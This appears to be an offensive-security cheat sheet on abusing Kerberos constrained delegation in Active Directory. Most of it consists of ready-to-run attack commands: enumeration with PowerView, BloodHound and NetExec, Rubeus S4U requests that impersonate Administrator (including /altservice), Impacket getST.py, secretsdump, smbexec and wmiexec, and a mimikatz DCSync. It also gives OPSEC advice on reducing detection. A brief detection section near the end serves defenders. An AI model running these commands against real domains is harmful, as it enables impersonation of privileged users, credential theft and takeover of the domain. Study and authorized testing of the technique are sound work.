# Constrained Delegation Abuse

## Overview

Constrained delegation limits which **services** a computer or user can impersonate on behalf of another user. The `msDS-AllowedToDelegateTo` attribute lists the SPNs the account is allowed to delegate to.

If an account has **protocol transition** enabled (`TrustedToAuthForDelegation`), it can use S4U2Self to obtain a service ticket for ANY user (including users who did not authenticate), then use S4U2Proxy to request a ticket on their behalf to the allowed service.

This is commonly seen on service accounts (e.g., IIS, MSSQL, Exchange) that run web applications or middleware.

## Finding Constrained Delegation

### PowerView

```powershell
# Find users with constrained delegation (TrustedToAuth = protocol transition)
Get-DomainUser -TrustedToAuth

# Find computers with constrained delegation
Get-DomainComputer -TrustedToAuth

# Show the SPNs they can delegate to
Get-DomainUser -TrustedToAuth -Properties serviceprincipalname,msDS-AllowedToDelegateTo,samaccountname

# For a specific user/computer
Get-DomainUser -Identity svc_account -Properties msDS-AllowedToDelegateTo,samaccountname,useraccountcontrol

# Get all attributes related to delegation
Get-DomainObject -Identity svc_account -Properties msDS-AllowedToDelegateTo,userAccountControl,TrustedToAuthForDelegation
```

### BloodHound

```cypher
// Users with constrained delegation
MATCH (u:User) WHERE u.trustedtoauth IS NOT NULL RETURN u.name, u.trustedtoauth

// Computers with constrained delegation
MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate

// Constrained delegation attack paths
MATCH (u:User {trustedtoauth:"*"})
MATCH (c:Computer)
WHERE u.allowedtodelegate CONTAINS c.name
MATCH (da:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (da)-[:HasSession]->(c)
RETURN u.name, c.name, da.name
```

### NetExec

```bash
# Find accounts with constrained delegation
nxc ldap dc01.domain.local -u user -p pass --trusted-to-auth

# Delegation module
nxc ldap dc01.domain.local -u user -p pass -M delegation
```

## Exploitation: S4U2Self + S4U2Proxy

### Prerequisites
- Compromised hash (RC4 / AES) of the account with constrained delegation
- Know the user to impersonate (e.g., `Administrator`)
- Know the SPN of the target service (e.g., `cifs/target.domain.com`)

### Step 1: Identify Constrained Delegation Targets

```powershell
# Find which SPNs the compromised account can delegate to
Get-DomainUser -Identity svc_account -Properties msDS-AllowedToDelegateTo

# Output:
# msDS-AllowedToDelegateTo
# -------------------------
# {cifs/dc01.domain.local, ldap/dc01.domain.local}
```

### Step 2: Request TGS with Rubeus (Windows)

```powershell
# Basic S4U — request TGS for cifs to target
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.com /ptt

# With output to file
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.com /nowrap /ticket:svc_ticket.kirbi

# Specify domain
Rubeus.exe s4u /user:svc_account /domain:domain.local /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.com /ptt

# Alternative service (use /altservice to request different SPN than allowed)
# If allowed to delegate for cifs/dc01, can also get ldap, host, etc. via altservice
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.com /altservice:host,ldap /ptt

# Multiple altservices
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.com /altservice:cifs,ldap,http,host /ptt
```

### Step 3: Use Stolen TGS (Impacket — Linux)

```bash
# From Linux with getST.py (Impacket)
python3 getST.py domain.local/svc_account:HASH -spn cifs/target.domain.com -impersonate Administrator -dc-ip 10.10.10.10

# With AES key
python3 getST.py domain.local/svc_account -aesKey AES256_HEX -spn cifs/target.domain.com -impersonate Administrator -dc-ip 10.10.10.10

# Use obtained ticket
export KRB5CCNAME=/path/to/Administrator.ccache
python3 secretsdump.py -k -target-ip 10.10.10.10 dc01.domain.local

# Access target via SMB
python3 smbexec.py -k -no-pass target.domain.local
python3 wmiexec.py -k -no-pass target.domain.local

# Request without impersonation (just get TGS for the service)
python3 getST.py domain.local/user:pass -spn cifs/target.domain.com
```

### Step 4: Verify and Use Ticket

```powershell
# On Windows after /ptt:
klist

# Access service
ls \\target.domain.com\c$
dir \\dc01.domain.local\c$

# PowerShell remoting
Enter-PSSession -ComputerName dc01.domain.local

# DCSync (if you have ldap or cifs to DC)
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:Administrator" exit
```

## Exploitation Examples by Scenario

### Scenario 1: MSSQL Service Account with Constrained Delegation to DC

```powershell
# Find account
Get-DomainUser -TrustedToAuth | ? { $_.samaccountname -like "*sql*" }

# RC4 hash from DC sync or compromised
Rubeus.exe s4u /user:sql_svc /rc4:7a6b... /impersonateuser:Administrator /msdsspn:MSSQLSvc/dc01.domain.local /ptt

# Or cifs for file access
Rubeus.exe s4u /user:sql_svc /rc4:7a6b... /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.local /ptt
```

### Scenario 2: IIS Service Account Delegation to File Server

```powershell
# Find
Get-DomainUser -TrustedToAuth | ? serviceprincipalname -like "http/*"

# Exploit
Rubeus.exe s4u /user:iis_svc /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/fileserver.domain.com /ptt

# Access files
dir \\fileserver.domain.com\share$
```

### Scenario 3: Machine Account Constrained Delegation

```powershell
# Computers can also have constrained delegation
Get-DomainComputer -TrustedToAuth

# Use machine account hash (from DC sync or compromise)
Rubeus.exe s4u /user:WS01$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.com /altservice:host,ldap /ptt
```

### Scenario 4: Multiple Service Targets

```powershell
# If allowed to delegate to multiple SPNs, request each
Rubeus.exe s4u /user:svc_acct /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.com /ptt
Rubeus.exe s4u /user:svc_acct /rc4:HASH /impersonateuser:Administrator /msdsspn:ldap/dc01.domain.com /ptt
```

## S4U2Self Without Protocol Transition

If the account has constrained delegation **without** protocol transition (`TrustedToAuthForDelegation` is not set), S4U2Self only works for users who authenticated with Kerberos (not NTLM). In this case:

- You can still use S4U2Proxy but need the user to have authenticated via Kerberos first
- The attack is more limited
- Most modern accounts found vulnerable have protocol transition enabled

## Advanced: Using NetExec for Delegation Abuse

```bash
# Check constrained delegation with nxc
nxc ldap dc01.domain.local -u user -p pass -M delegation -o DELEGATION_TYPE=CONSTRAINED

# nxc can also help find the delegation info automatically
```

## OPSEC Considerations

- **S4U2Self + S4U2Proxy** requests generate Event ID 4769 (Kerberos TGS requests) on the Domain Controller
- The KDC logs `S4U2Self` and `S4U2Proxy` events with specific flags
- **RC4** (NTLM hash) in TGS request is more suspicious than AES in modern environments
- **/altservice** flag generates additional TGS requests — more events
- **getST.py** from Linux uses the same protocol but from a non-domain-joined perspective
- **Ticket lifetime**: Obtained tickets are typically valid for the default Kerberos ticket lifetime (10 hours, configurable)
- **Renewal**: Tickets can be renewed if the `renewable` flag is set (default in constrained delegation TGS)

## Detection

| Event ID | Description | Notes |
|----------|-------------|-------|
| 4769 | Kerberos TGS request | Check for S4U2Self flags |
| 4768 | Kerberos TGT request | If new authentication triggered |
| 4624 | Successful logon | Delegated auth may show unusual logon type |
| 4672 | Special privileges assigned | Logon with delegated identity |

### Blue Team Detection

```powershell
# Detect S4U2Self / S4U2Proxy abuse via 4769
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769} |
  Where-Object { $_.Properties[10].Value -match "S4U2Self|S4U2Proxy" }

# Monitor for TGS requests with forwardable flag for delegation
# RC4 encryption in TGS (0x17) vs AES (0x12, 0x13)
# Look for TGS requests where:
#   - TicketEncryptionType != 0x12 && TicketEncryptionType != 0x13 (i.e., RC4 used)
#   - Source account is a service account with delegation rules
```

## Quick Reference

```powershell
# Find constrained delegation users
Get-DomainUser -TrustedToAuth

# Find constrained delegation computers
Get-DomainComputer -TrustedToAuth

# Show delegated SPNs
Get-DomainUser -TrustedToAuth -Properties msDS-AllowedToDelegateTo

# S4U2Self+S4U2Proxy (Rubeus)
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.com /ptt

# Alternative service (if cifs allowed, also get ldap, host)
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.com /altservice:host,ldap /ptt

# getST.py from Linux
python3 getST.py domain.local/svc_account:HASH -spn cifs/target.domain.com -impersonate Administrator -dc-ip DC

# Use ticket
export KRB5CCNAME=Administrator.ccache
python3 smbexec.py -k -no-pass target.domain.com

# BloodHound query
MATCH (u:User) WHERE u.trustedtoauth IS NOT NULL RETURN u.name, u.trustedtoauth
```
